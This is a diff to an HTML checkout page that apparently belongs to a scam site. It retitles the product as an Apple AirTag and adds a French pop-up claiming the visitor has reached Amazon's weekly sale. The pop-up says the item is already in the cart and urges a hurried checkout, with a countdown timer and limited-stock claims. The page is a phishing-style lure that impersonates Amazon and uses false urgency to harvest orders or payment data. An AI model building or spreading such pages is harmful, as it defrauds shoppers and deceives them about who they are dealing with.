@@ -10,7 +10,7 @@
     <meta name="viewport" content="width=device-width, initial-scale=1" />
     <link rel="shortcut icon" href="./src/img/favicon.png" />
 
-    <title>Cat’s Best Original - litière pour chats agglutinante - 40L / 17.2kg
+    <title>Apple AirTag
     </title>
 
     <link rel="stylesheet" href="src/css/intlTelInput.css" />
@@ -356,6 +356,36 @@
     </section>
 
     <section style="display: none" id="checkout">
+        <section class="modal" aria-hidden="true" id="modalStart" style="display: block;">
+            <div class="modal__wrapper">
+                <div class="modal__content start__modal">
+                    <div class="modal__header-container">
+                        <!-- <h2 class="modal__header-title">Tente ta chance</h2> -->
+                        <button class="modal__cross" id="modalExit">
+                        </button>
+                    </div>
+
+                    <div class="modal__img-container">
+                        <img id="startImage">
+                    </div>
+
+                    <p class="modal__text modal__text-start">
+                        Bienvenue!
+                        <br><br>
+                        Vous êtes arrivé à la vente hebdomadaire d'Amazon.
+                        La durée de l'offre et la quantité de produits promotionnels sont limitées.
+                        <br><br>
+                        Le produit est déjà dans votre panier.<br>
+                        Dépêchez-vous de finaliser votre commande.<br>
+                        La livraison prendra 3 à 5 jours. Bonne chance!
+                    </p>
+
+                    <button type="button" class="button modal__button modal__button-ok modal__button-start"
+                        aria-label="Inténtalo de nuevo" id="modalExit">PARTICIPAR</button>
+                </div>
+            </div>
+        </section>
+
         <div id="timer">
             <div id="timerText" class="text"></div>
             <div class="timer">
@@ -595,7 +625,7 @@
                                                         </div>
                                                     </div>
                                                 </fieldset>
-                                                <div class="row mx-0 mb-3">
+                                                <div class="row mx-0 mt-2">
                                                     <div class="col-12 next-step-button ml-lg-auto px-lg-0">
                                                         <div class="pt-lg-4 ml-lg-3">
                                                             <button id="submitButton" type="submit"
